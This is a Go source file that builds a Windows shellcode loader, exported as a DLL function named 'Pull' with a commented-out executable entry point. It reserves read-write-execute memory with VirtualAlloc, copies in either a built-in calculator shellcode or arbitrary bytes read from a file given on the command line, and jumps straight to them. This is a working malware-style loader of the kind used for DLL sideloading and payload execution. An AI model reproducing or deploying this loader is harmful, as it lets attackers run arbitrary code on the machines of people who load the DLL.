package main

import "C"
import (
	"io/ioutil"
	"os"
	"syscall"
	"unsafe"

	"github.com/zetamatta/go-outputdebug"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32           = syscall.MustLoadDLL("kernel32.dll")
	ntdll              = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc       = kernel32.MustFindProc("VirtualAlloc")
	RtlMoveMemory      = kernel32.MustFindProc("RtlMoveMemory")
	outputDebugStringW = kernel32.MustFindProc("OutputDebugStringW")
)

func outputdebugstring(s string) {
	p, err := syscall.UTF16PtrFromString(s)
	if err == nil {
		outputDebugStringW.Call(uintptr(unsafe.Pointer(p)))
	}
}

func checkErr(err error) {
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			outputdebug.String("os.Args > 1")
			println(err.Error())
			os.Exit(1)
		}
	}
}

//export Pull
func Pull() {
	outputdebugstring("begin")
	shellcode := shellcode_calc
	outputdebugstring("shellcode_calc")
	if len(os.Args) > 1 {
		outputdebugstring("os.Args > 1")
		shellcodeFileData, err := ioutil.ReadFile(os.Args[1])
		checkErr(err)
		shellcode = shellcodeFileData
	}
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	outputdebugstring("VirtualAlloc.Call")
	if addr == 0 {
		outputdebugstring("addr == 0")
		checkErr(err)
	}
	_, _, err = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	outputdebugstring("RtlMoveMemory.Call")
	checkErr(err)
	syscall.Syscall(addr, 0, 0, 0, 0)
}

//.exe
func main() {
	/* outputdebugstring("begin")
	shellcode := shellcode_calc
	outputdebugstring("shellcode_calc")
	if len(os.Args) > 1 {
		outputdebugstring("os.Args > 1")
		shellcodeFileData, err := ioutil.ReadFile(os.Args[1])
		checkErr(err)
		shellcode = shellcodeFileData
	}
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	outputdebugstring("VirtualAlloc.Call")
	if addr == 0 {
		outputdebugstring("addr == 0")
		checkErr(err)
	}
	_, _, err = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	outputdebugstring("RtlMoveMemory.Call")
	checkErr(err)
	syscall.Syscall(addr, 0, 0, 0, 0) */
}
